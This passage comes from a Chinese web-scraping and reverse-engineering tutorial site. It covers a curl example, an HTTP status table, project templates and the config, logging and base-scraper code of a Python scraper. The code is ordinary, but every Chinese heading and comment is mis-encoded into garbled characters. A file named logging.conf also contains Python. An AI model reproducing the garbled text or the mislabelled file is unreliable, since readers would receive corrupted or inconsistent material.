<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Accept: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer your_token_here&quot;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;X-Custom-Header: custom_value&quot;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;key&quot;:&quot;value&quot;}&#39;</span>
</code></pre>
      </div>

      <h2 id="å¸¸è§çŠ¶æ€ç å¯¹ç…§">å¸¸è§çŠ¶æ€ç å¯¹ç…§</h2>

      <table>
        <thead>
          <tr>
            <th>çŠ¶æ€ç </th>
            <th>è¯´æ˜</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>200</td>
            <td>OK - æˆåŠŸ</td>
          </tr>
          <tr>
            <td>201</td>
            <td>Created - å·²åˆ›å»º</td>
          </tr>
          <tr>
            <td>204</td>
            <td>No Content - æ— å†…å®¹</td>
          </tr>
          <tr>
            <td>301</td>
            <td>Moved Permanently - æ°¸ä¹…é‡å®šå‘</td>
          </tr>
          <tr>
            <td>302</td>
            <td>Found - ä¸´æ—¶é‡å®šå‘</td>
          </tr>
          <tr>
            <td>304</td>
            <td>Not Modified - æœªä¿®æ”¹ï¼ˆç¼“å­˜æœ‰æ•ˆï¼‰</td>
          </tr>
          <tr>
            <td>400</td>
            <td>Bad Request - è¯·æ±‚é”™è¯¯</td>
          </tr>
          <tr>
            <td>401</td>
            <td>Unauthorized - æœªæˆæƒ</td>
          </tr>
          <tr>
            <td>403</td>
            <td>Forbidden - ç¦æ­¢è®¿é—®</td>
          </tr>
          <tr>
            <td>404</td>
            <td>Not Found - æœªæ‰¾åˆ°</td>
          </tr>
          <tr>
            <td>405</td>
            <td>Method Not Allowed - æ–¹æ³•ä¸å…è®¸</td>
          </tr>
          <tr>
            <td>429</td>
            <td>Too Many Requests - è¯·æ±‚è¿‡å¤š</td>
          </tr>
          <tr>
            <td>500</td>
            <td>Internal Server Error - æœåŠ¡å™¨é”™è¯¯</td>
          </tr>
          <tr>
            <td>502</td>
            <td>Bad Gateway - ç½‘å…³é”™è¯¯</td>
          </tr>
          <tr>
            <td>503</td>
            <td>Service Unavailable - æœåŠ¡ä¸å¯ç”¨</td>
          </tr>
        </tbody>
      </table>

      <h2 id="ç›¸å…³ç« èŠ‚">ğŸ“š ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#01-Foundations-http-https-protocol">HTTP/HTTPS åè®®</a></li>
        <li><a href="#03-Basic-Recipes-api-reverse-engineering">API é€†å‘</a></li>
        <li><a href="#08-Cheat-Sheets-common-commands">å¸¸ç”¨å‘½ä»¤</a></li>
      </ul>

    </div>

    <div class="section" id="09-Templates-index">
      <h2>68. Overview</h2>
      <h1 id="é¡¹ç›®æ¨¡æ¿-templates">é¡¹ç›®æ¨¡æ¿ - Templates</h1>

      <p>å³ç”¨å‹é¡¹ç›®æ¨¡æ¿å’Œé…ç½®æ–‡ä»¶ï¼Œå¸®åŠ©ä½ å¿«é€Ÿå¯åŠ¨æ–°çš„é€†å‘é¡¹ç›®ã€‚</p>

      <hr />

      <h2 id="å¯ç”¨æ¨¡æ¿">ğŸ“¦ å¯ç”¨æ¨¡æ¿</h2>

      <h3 id="åŸºç¡€çˆ¬è™«é¡¹ç›®09-templates-basic-scraper">ğŸ <a href="#09-Templates-basic-scraper">åŸºç¡€çˆ¬è™«é¡¹ç›®</a></h3>

      <p>ä¸€ä¸ªç®€å•çš„ Python çˆ¬è™«é¡¹ç›®ç»“æ„ï¼ŒåŒ…å«ï¼š</p>

      <ul>
        <li>æ ‡å‡†ç›®å½•ç»“æ„</li>
        <li>é…ç½®æ–‡ä»¶ç®¡ç†</li>
        <li>æ—¥å¿—ç³»ç»Ÿ</li>
        <li>æ•°æ®å­˜å‚¨</li>
        <li>é”™è¯¯å¤„ç†</li>
      </ul>

      <p><strong>é€‚ç”¨äº</strong>: å•æœºçˆ¬è™«ã€API æ•°æ®é‡‡é›†</p>

      <hr />

      <h3 id="é€†å‘åˆ†æé¡¹ç›®09-templates-reverse-project">ğŸ¯ <a href="#09-Templates-reverse-project">é€†å‘åˆ†æé¡¹ç›®</a></h3>

      <p>Web é€†å‘åˆ†æçš„æ ‡å‡†é¡¹ç›®æ¨¡æ¿ï¼š</p>

      <ul>
        <li>åˆ†ææ–‡æ¡£æ¨¡æ¿</li>
        <li>ä»£ç ç»„ç»‡ç»“æ„</li>
        <li>æµ‹è¯•ç”¨ä¾‹</li>
        <li>å¤ç°è„šæœ¬</li>
      </ul>

      <p><strong>é€‚ç”¨äº</strong>: å•ä¸ªç½‘ç«™çš„å®Œæ•´é€†å‘åˆ†æ</p>

      <hr />

      <h3 id="docker-éƒ¨ç½²é…ç½®09-templates-docker-setup">ğŸ³ <a href="#09-Templates-docker-setup">Docker éƒ¨ç½²é…ç½®</a></h3>

      <p>å®¹å™¨åŒ–éƒ¨ç½²é…ç½®ï¼š</p>

      <ul>
        <li>Dockerfile</li>
        <li>docker-compose.yml</li>
        <li>ç¯å¢ƒå˜é‡é…ç½®</li>
        <li>ç½‘ç»œé…ç½®</li>
      </ul>

      <p><strong>é€‚ç”¨äº</strong>: çˆ¬è™«éƒ¨ç½²ã€æœåŠ¡åŒ–</p>

      <hr />

      <h3 id="cicd-æµæ°´çº¿09-templates-cicd-pipeline">ğŸ”„ <a href="#09-Templates-cicd-pipeline">CI/CD æµæ°´çº¿</a></h3>

      <p>è‡ªåŠ¨åŒ–æ„å»ºå’Œéƒ¨ç½²ï¼š</p>

      <ul>
        <li>GitHub Actions</li>
        <li>GitLab CI</li>
        <li>Jenkins</li>
        <li>è‡ªåŠ¨åŒ–æµ‹è¯•</li>
      </ul>

      <p><strong>é€‚ç”¨äº</strong>: æŒç»­é›†æˆã€è‡ªåŠ¨åŒ–éƒ¨ç½²</p>

      <hr />

      <h3 id="åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„09-templates-distributed-crawler">ğŸ“Š <a href="#09-Templates-distributed-crawler">åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„</a></h3>

      <p>åŸºäº Scrapy + Redis çš„åˆ†å¸ƒå¼æ¶æ„ï¼š</p>

      <ul>
        <li>Scrapy é¡¹ç›®ç»“æ„</li>
        <li>Redis é˜Ÿåˆ—é…ç½®</li>
        <li>åˆ†å¸ƒå¼è°ƒåº¦</li>
        <li>ç›‘æ§å’Œæ—¥å¿—</li>
      </ul>

      <p><strong>é€‚ç”¨äº</strong>: å¤§è§„æ¨¡æ•°æ®é‡‡é›†</p>

      <hr />

      <h2 id="å¿«é€Ÿå¼€å§‹">ğŸš€ å¿«é€Ÿå¼€å§‹</h2>

      <h3 id="ä½¿ç”¨æ¨¡æ¿">ä½¿ç”¨æ¨¡æ¿</h3>

      <ol>
        <li><strong>å¤åˆ¶æ¨¡æ¿ç›®å½•</strong></li>
      </ol>

      <div class="codehilite">
        <pre><span></span><code>cp<span class="w"> </span>-r<span class="w"> </span>templates/basic_scraper<span class="w"> </span>my_project
<span class="nb">cd</span><span class="w"> </span>my_project
</code></pre>
      </div>

      <ol start="2">
        <li><strong>å®‰è£…ä¾èµ–</strong></li>
      </ol>

      <div class="codehilite">
        <pre><span></span><code>pip<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt
</code></pre>
      </div>

      <ol start="3">
        <li><strong>é…ç½®å‚æ•°</strong></li>
      </ol>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ç¼–è¾‘ config.py</span>
vim<span class="w"> </span>config.py
</code></pre>
      </div>

      <ol start="4">
        <li><strong>è¿è¡Œé¡¹ç›®</strong></li>
      </ol>

      <div class="codehilite">
        <pre><span></span><code>python<span class="w"> </span>main.py
</code></pre>
      </div>

      <hr />

      <h2 id="è‡ªå®šä¹‰æ¨¡æ¿">ğŸ“ è‡ªå®šä¹‰æ¨¡æ¿</h2>

      <p>ä½ å¯ä»¥åŸºäºè¿™äº›æ¨¡æ¿åˆ›å»ºè‡ªå·±çš„é¡¹ç›®ï¼š</p>

      <h3 id="ä¿®æ”¹é…ç½®">ä¿®æ”¹é…ç½®</h3>

      <ul>
        <li>æ›´æ–° <code>config.py</code> ä¸­çš„ç›®æ ‡ URL</li>
        <li>ä¿®æ”¹è¯·æ±‚å¤´å’Œå‚æ•°</li>
        <li>é…ç½®æ•°æ®åº“è¿æ¥</li>
      </ul>

      <h3 id="æ‰©å±•åŠŸèƒ½">æ‰©å±•åŠŸèƒ½</h3>

      <ul>
        <li>æ·»åŠ æ–°çš„çˆ¬è™«æ¨¡å—</li>
        <li>é›†æˆæ›´å¤šæ•°æ®æº</li>
        <li>å®ç°è‡ªå®šä¹‰ä¸­é—´ä»¶</li>
      </ul>

      <hr />

      <h2 id="æœ€ä½³å®è·µ">ğŸ’¡ æœ€ä½³å®è·µ</h2>

      <h3 id="é¡¹ç›®ç»“æ„å»ºè®®">é¡¹ç›®ç»“æ„å»ºè®®</h3>

      <pre><code>project/
â”œâ”€â”€ config/              # é…ç½®æ–‡ä»¶
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ settings.py
â”‚   â””â”€â”€ logging.conf
â”œâ”€â”€ spiders/            # çˆ¬è™«æ¨¡å—
â”‚   â”œâ”€â”€ __init__.py
â”‚   â””â”€â”€ target_spider.py
â”œâ”€â”€ utils/              # å·¥å…·å‡½æ•°
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ crypto.py       # åŠ å¯†è§£å¯†
â”‚   â””â”€â”€ headers.py      # è¯·æ±‚å¤´ç”Ÿæˆ
â”œâ”€â”€ data/               # æ•°æ®å­˜å‚¨
â”‚   â””â”€â”€ output/
â”œâ”€â”€ logs/               # æ—¥å¿—æ–‡ä»¶
â”œâ”€â”€ tests/              # æµ‹è¯•ç”¨ä¾‹
â”‚   â””â”€â”€ test_spider.py
â”œâ”€â”€ requirements.txt    # ä¾èµ–åˆ—è¡¨
â”œâ”€â”€ README.md          # é¡¹ç›®è¯´æ˜
â””â”€â”€ main.py            # å…¥å£æ–‡ä»¶
</code></pre>

      <h3 id="é…ç½®ç®¡ç†">é…ç½®ç®¡ç†</h3>

      <p>ä½¿ç”¨ç¯å¢ƒå˜é‡å’Œé…ç½®æ–‡ä»¶åˆ†ç¦»æ•æ„Ÿä¿¡æ¯ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># config/settings.py</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">dotenv</span><span class="w"> </span><span class="kn">import</span> <span class="n">load_dotenv</span>

<span class="n">load_dotenv</span><span class="p">()</span>

<span class="c1"># æ•°æ®åº“é…ç½®</span>
<span class="n">DB_HOST</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;DB_HOST&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span><span class="p">)</span>
<span class="n">DB_USER</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;DB_USER&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">)</span>
<span class="n">DB_PASS</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;DB_PASS&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

<span class="c1"># API é…ç½®</span>
<span class="n">API_KEY</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;API_KEY&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="n">SECRET_KEY</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="ç‰ˆæœ¬æ§åˆ¶">ç‰ˆæœ¬æ§åˆ¶</h3>

      <p><code>.gitignore</code> ç¤ºä¾‹ï¼š</p>

      <pre><code># Python
__pycache__/
*.py[cod]
*.egg-info/
venv/
.env

# æ•°æ®å’Œæ—¥å¿—
data/
logs/
*.log

# IDE
.vscode/
.idea/
*.swp

# æ•æ„Ÿä¿¡æ¯
config/secrets.py
.env.local
</code></pre>

      <hr />

      <h2 id="ç›¸å…³èµ„æº">ğŸ”— ç›¸å…³èµ„æº</h2>

      <ul>
        <li><a href="#06-Engineering-docker-deployment">Docker éƒ¨ç½²</a></li>
        <li><a href="#06-Engineering-distributed-scraping">åˆ†å¸ƒå¼çˆ¬è™«</a></li>
        <li><a href="#06-Engineering-monitoring-and-alerting">ç›‘æ§å‘Šè­¦</a></li>
      </ul>

      <hr />

      <p>Happy Coding! ğŸš€</p>

    </div>

    <div class="section" id="09-Templates-basic-scraper">
      <h2>69. Basic Scraper</h2>
      <h1 id="åŸºç¡€çˆ¬è™«é¡¹ç›®æ¨¡æ¿">åŸºç¡€çˆ¬è™«é¡¹ç›®æ¨¡æ¿</h1>

      <p>ä¸€ä¸ªç®€å•ä½†å®Œæ•´çš„ Python çˆ¬è™«é¡¹ç›®æ¨¡æ¿ï¼Œé€‚åˆå•æœºæ•°æ®é‡‡é›†ã€‚</p>

      <hr />

      <h2 id="é¡¹ç›®ç»“æ„">ğŸ“ é¡¹ç›®ç»“æ„</h2>

      <pre><code>basic_scraper/
â”œâ”€â”€ config/
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ settings.py          # é…ç½®å‚æ•°
â”‚   â””â”€â”€ logging.conf         # æ—¥å¿—é…ç½®
â”œâ”€â”€ scrapers/
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ base_scraper.py      # åŸºç¡€çˆ¬è™«ç±»
â”‚   â””â”€â”€ target_scraper.py    # ç›®æ ‡ç½‘ç«™çˆ¬è™«
â”œâ”€â”€ utils/
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ crypto.py            # åŠ å¯†è§£å¯†å·¥å…·
â”‚   â”œâ”€â”€ headers.py           # è¯·æ±‚å¤´ç”Ÿæˆ
â”‚   â””â”€â”€ parser.py            # æ•°æ®è§£æ
â”œâ”€â”€ data/
â”‚   â”œâ”€â”€ raw/                 # åŸå§‹æ•°æ®
â”‚   â””â”€â”€ processed/           # å¤„ç†åæ•°æ®
â”œâ”€â”€ logs/                    # æ—¥å¿—ç›®å½•
â”œâ”€â”€ tests/
â”‚   â”œâ”€â”€ __init__.py
â”‚   â””â”€â”€ test_scraper.py      # æµ‹è¯•ç”¨ä¾‹
â”œâ”€â”€ .env.example             # ç¯å¢ƒå˜é‡ç¤ºä¾‹
â”œâ”€â”€ .gitignore
â”œâ”€â”€ requirements.txt
â”œâ”€â”€ README.md
â””â”€â”€ main.py                  # å…¥å£æ–‡ä»¶
</code></pre>

      <hr />

      <h2 id="æ–‡ä»¶å†…å®¹">ğŸ“„ æ–‡ä»¶å†…å®¹</h2>

      <h3 id="1-requirementstxt">1. requirements.txt</h3>

      <pre><code>requests&gt;=2.31.0
beautifulsoup4&gt;=4.12.0
lxml&gt;=4.9.0
python-dotenv&gt;=1.0.0
pycryptodome&gt;=3.19.0
pymongo&gt;=4.6.0
redis&gt;=5.0.0
loguru&gt;=0.7.0
</code></pre>

      <h3 id="2-configsettingspy">2. config/settings.py</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">é¡¹ç›®é…ç½®æ–‡ä»¶</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">dotenv</span><span class="w"> </span><span class="kn">import</span> <span class="n">load_dotenv</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">pathlib</span><span class="w"> </span><span class="kn">import</span> <span class="n">Path</span>

<span class="c1"># åŠ è½½ç¯å¢ƒå˜é‡</span>
<span class="n">load_dotenv</span><span class="p">()</span>

<span class="c1"># é¡¹ç›®æ ¹ç›®å½•</span>
<span class="n">BASE_DIR</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span><span class="o">.</span><span class="n">resolve</span><span class="p">()</span><span class="o">.</span><span class="n">parent</span><span class="o">.</span><span class="n">parent</span>

<span class="c1"># ç›®æ ‡ç½‘ç«™é…ç½®</span>
<span class="n">TARGET_URL</span> <span class="o">=</span> <span class="s2">&quot;https://example.com&quot;</span>
<span class="n">API_BASE_URL</span> <span class="o">=</span> <span class="s2">&quot;https://api.example.com&quot;</span>

<span class="c1"># è¯·æ±‚é…ç½®</span>
<span class="n">REQUEST_TIMEOUT</span> <span class="o">=</span> <span class="mi">30</span>
<span class="n">MAX_RETRIES</span> <span class="o">=</span> <span class="mi">3</span>
<span class="n">RETRY_DELAY</span> <span class="o">=</span> <span class="mi">2</span>  <span class="c1"># ç§’</span>

<span class="c1"># è¯·æ±‚å¤´é…ç½®</span>
<span class="n">DEFAULT_HEADERS</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json, text/plain, */*&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;zh-CN,zh;q=0.9,en;q=0.8&#39;</span><span class="p">,</span>
    <span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate, br&#39;</span><span class="p">,</span>
<span class="p">}</span>

<span class="c1"># ä»£ç†é…ç½®</span>
<span class="n">USE_PROXY</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;USE_PROXY&#39;</span><span class="p">,</span> <span class="s1">&#39;false&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="s1">&#39;true&#39;</span>
<span class="n">PROXY_URL</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;PROXY_URL&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
<span class="n">PROXIES</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="n">PROXY_URL</span><span class="p">,</span>
    <span class="s1">&#39;https&#39;</span><span class="p">:</span> <span class="n">PROXY_URL</span><span class="p">,</span>
<span class="p">}</span> <span class="k">if</span> <span class="n">USE_PROXY</span> <span class="ow">and</span> <span class="n">PROXY_URL</span> <span class="k">else</span> <span class="kc">None</span>

<span class="c1"># æ•°æ®åº“é…ç½®</span>
<span class="n">MONGODB_URI</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;MONGODB_URI&#39;</span><span class="p">,</span> <span class="s1">&#39;mongodb://localhost:27017/&#39;</span><span class="p">)</span>
<span class="n">MONGODB_DB</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;MONGODB_DB&#39;</span><span class="p">,</span> <span class="s1">&#39;scraper_db&#39;</span><span class="p">)</span>
<span class="n">MONGODB_COLLECTION</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;MONGODB_COLLECTION&#39;</span><span class="p">,</span> <span class="s1">&#39;data&#39;</span><span class="p">)</span>

<span class="c1"># Redis é…ç½®</span>
<span class="n">REDIS_HOST</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;REDIS_HOST&#39;</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span><span class="p">)</span>
<span class="n">REDIS_PORT</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;REDIS_PORT&#39;</span><span class="p">,</span> <span class="mi">6379</span><span class="p">))</span>
<span class="n">REDIS_DB</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;REDIS_DB&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
<span class="n">REDIS_PASSWORD</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;REDIS_PASSWORD&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

<span class="c1"># æ•°æ®å­˜å‚¨é…ç½®</span>
<span class="n">DATA_DIR</span> <span class="o">=</span> <span class="n">BASE_DIR</span> <span class="o">/</span> <span class="s1">&#39;data&#39;</span>
<span class="n">RAW_DATA_DIR</span> <span class="o">=</span> <span class="n">DATA_DIR</span> <span class="o">/</span> <span class="s1">&#39;raw&#39;</span>
<span class="n">PROCESSED_DATA_DIR</span> <span class="o">=</span> <span class="n">DATA_DIR</span> <span class="o">/</span> <span class="s1">&#39;processed&#39;</span>

<span class="c1"># æ—¥å¿—é…ç½®</span>
<span class="n">LOG_DIR</span> <span class="o">=</span> <span class="n">BASE_DIR</span> <span class="o">/</span> <span class="s1">&#39;logs&#39;</span>
<span class="n">LOG_LEVEL</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;LOG_LEVEL&#39;</span><span class="p">,</span> <span class="s1">&#39;INFO&#39;</span><span class="p">)</span>

<span class="c1"># åˆ›å»ºå¿…è¦çš„ç›®å½•</span>
<span class="k">for</span> <span class="n">directory</span> <span class="ow">in</span> <span class="p">[</span><span class="n">DATA_DIR</span><span class="p">,</span> <span class="n">RAW_DATA_DIR</span><span class="p">,</span> <span class="n">PROCESSED_DATA_DIR</span><span class="p">,</span> <span class="n">LOG_DIR</span><span class="p">]:</span>
    <span class="n">directory</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="n">parents</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="c1"># ä¸šåŠ¡é…ç½®</span>
<span class="n">BATCH_SIZE</span> <span class="o">=</span> <span class="mi">100</span>  <span class="c1"># æ‰¹å¤„ç†å¤§å°</span>
<span class="n">SLEEP_INTERVAL</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>  <span class="c1"># è¯·æ±‚é—´éš”ï¼ˆç§’ï¼‰èŒƒå›´</span>
</code></pre>
      </div>

      <h3 id="3-configloggingconf">3. config/logging.conf</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">æ—¥å¿—é…ç½®</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">loguru</span><span class="w"> </span><span class="kn">import</span> <span class="n">logger</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">pathlib</span><span class="w"> </span><span class="kn">import</span> <span class="n">Path</span>

<span class="c1"># æ—¥å¿—ç›®å½•</span>
<span class="n">LOG_DIR</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span><span class="o">.</span><span class="n">resolve</span><span class="p">()</span><span class="o">.</span><span class="n">parent</span><span class="o">.</span><span class="n">parent</span> <span class="o">/</span> <span class="s1">&#39;logs&#39;</span>
<span class="n">LOG_DIR</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="c1"># ç§»é™¤é»˜è®¤å¤„ç†å™¨</span>
<span class="n">logger</span><span class="o">.</span><span class="n">remove</span><span class="p">()</span>

<span class="c1"># æ·»åŠ æ§åˆ¶å°è¾“å‡º</span>
<span class="n">logger</span><span class="o">.</span><span class="n">add</span><span class="p">(</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="p">,</span>
    <span class="n">colorize</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
    <span class="nb">format</span><span class="o">=</span><span class="s2">&quot;&lt;green&gt;{time:YYYY-MM-DD HH:mm:ss}&lt;/green&gt; | &lt;level&gt;</span><span class="si">{level: &lt;8}</span><span class="s2">&lt;/level&gt; | &lt;cyan&gt;</span><span class="si">{name}</span><span class="s2">&lt;/cyan&gt;:&lt;cyan&gt;</span><span class="si">{function}</span><span class="s2">&lt;/cyan&gt;:&lt;cyan&gt;</span><span class="si">{line}</span><span class="s2">&lt;/cyan&gt; - &lt;level&gt;</span><span class="si">{message}</span><span class="s2">&lt;/level&gt;&quot;</span><span class="p">,</span>
    <span class="n">level</span><span class="o">=</span><span class="s2">&quot;INFO&quot;</span>
<span class="p">)</span>

<span class="c1"># æ·»åŠ æ–‡ä»¶è¾“å‡º - INFO çº§åˆ«</span>
<span class="n">logger</span><span class="o">.</span><span class="n">add</span><span class="p">(</span>
    <span class="n">LOG_DIR</span> <span class="o">/</span> <span class="s2">&quot;info_{time:YYYY-MM-DD}.log&quot;</span><span class="p">,</span>
    <span class="n">rotation</span><span class="o">=</span><span class="s2">&quot;00:00&quot;</span><span class="p">,</span>  <span class="c1"># æ¯å¤©åˆå¤œè½®è½¬</span>
    <span class="n">retention</span><span class="o">=</span><span class="s2">&quot;30 days&quot;</span><span class="p">,</span>  <span class="c1"># ä¿ç•™30å¤©</span>
    <span class="n">encoding</span><span class="o">=</span><span class="s2">&quot;utf-8&quot;</span><span class="p">,</span>
    <span class="nb">format</span><span class="o">=</span><span class="s2">&quot;{time:YYYY-MM-DD HH:mm:ss} | </span><span class="si">{level: &lt;8}</span><span class="s2"> | </span><span class="si">{name}</span><span class="s2">:</span><span class="si">{function}</span><span class="s2">:</span><span class="si">{line}</span><span class="s2"> - </span><span class="si">{message}</span><span class="s2">&quot;</span><span class="p">,</span>
    <span class="n">level</span><span class="o">=</span><span class="s2">&quot;INFO&quot;</span>
<span class="p">)</span>

<span class="c1"># æ·»åŠ æ–‡ä»¶è¾“å‡º - ERROR çº§åˆ«</span>
<span class="n">logger</span><span class="o">.</span><span class="n">add</span><span class="p">(</span>
    <span class="n">LOG_DIR</span> <span class="o">/</span> <span class="s2">&quot;error_{time:YYYY-MM-DD}.log&quot;</span><span class="p">,</span>
    <span class="n">rotation</span><span class="o">=</span><span class="s2">&quot;00:00&quot;</span><span class="p">,</span>
    <span class="n">retention</span><span class="o">=</span><span class="s2">&quot;90 days&quot;</span><span class="p">,</span>  <span class="c1"># é”™è¯¯æ—¥å¿—ä¿ç•™90å¤©</span>
    <span class="n">encoding</span><span class="o">=</span><span class="s2">&quot;utf-8&quot;</span><span class="p">,</span>
    <span class="nb">format</span><span class="o">=</span><span class="s2">&quot;{time:YYYY-MM-DD HH:mm:ss} | </span><span class="si">{level: &lt;8}</span><span class="s2"> | </span><span class="si">{name}</span><span class="s2">:</span><span class="si">{function}</span><span class="s2">:</span><span class="si">{line}</span><span class="s2"> - </span><span class="si">{message}</span><span class="s2">&quot;</span><span class="p">,</span>
    <span class="n">level</span><span class="o">=</span><span class="s2">&quot;ERROR&quot;</span>
<span class="p">)</span>
</code></pre>
      </div>

      <h3 id="4-scrapersbase_scraperpy">4. scrapers/base_scraper.py</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">åŸºç¡€çˆ¬è™«ç±»</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">typing</span><span class="w"> </span><span class="kn">import</span> <span class="n">Dict</span><span class="p">,</span> <span class="n">Any</span><span class="p">,</span> <span class="n">Optional</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">config.settings</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">config.logging</span><span class="w"> </span><span class="kn">import</span> <span class="n">logger</span>


<span class="k">class</span><span class="w"> </span><span class="nc">BaseScraper</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;åŸºç¡€çˆ¬è™«ç±»&quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
